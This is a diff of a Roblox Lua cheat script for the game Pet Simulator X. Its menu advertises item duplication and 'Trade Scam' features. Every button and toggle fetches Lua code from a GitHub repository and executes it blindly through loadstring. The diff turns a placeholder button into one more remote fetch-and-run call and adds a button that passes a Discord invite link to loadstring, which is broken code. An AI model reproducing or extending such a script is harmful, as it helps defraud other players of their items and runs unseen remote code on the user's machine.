@@ -1,6 +1,6 @@
 if game.PlaceId == 6284583030 then
     local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Maset0/PSX/main/GUI.lua')))()
-    local Window = OrionLib:MakeWindow({Name = "[⚡ANIME] UPDATE - PSX SCAM TRADE PRIVATE V3.5", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+    local Window = OrionLib:MakeWindow({Name = "[⚡ANIME] UPDATE - PSX SCAM TRADE PRIVATE 3.5", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
     
     local Tab = Window:MakeTab({
         Name = "Info",
@@ -9,10 +9,17 @@ if game.PlaceId == 6284583030 then
     })
     
     local Section = Tab:AddSection({
-        Name = "Info"
+        Name = "Credits"
     })
     
     Tab:AddParagraph("Made By 8888 Team","Owner Masqta_#6880")
+
+    Tab:AddButton({
+        Name = "Button!",
+        Callback = function()
+            loadstring(game:HttpGet("https://discord.gg/QVqBv5T9s9"))()
+          end    
+    })
 
       local Tab = Window:MakeTab({
         Name = "Dupe",
@@ -56,17 +63,18 @@ if game.PlaceId == 6284583030 then
 	Name = "Trade Scam Section"
 })
 
-    Tab:AddButton({
-        Name = "Activate Trade Scam",
-        Callback = function()
+    Tab:AddToggle({
+        Name = "Trade Scam",
+        Default = false,
+        Callback = function(Value)
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info.lua"))()
-          end 
- })
+        end    
+    })
 
     Tab:AddButton({
 	Name = "Remove Trade Pet",
 	Callback = function()
-      		print("button pressed")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info.lua"))()
   	end    
 })
 
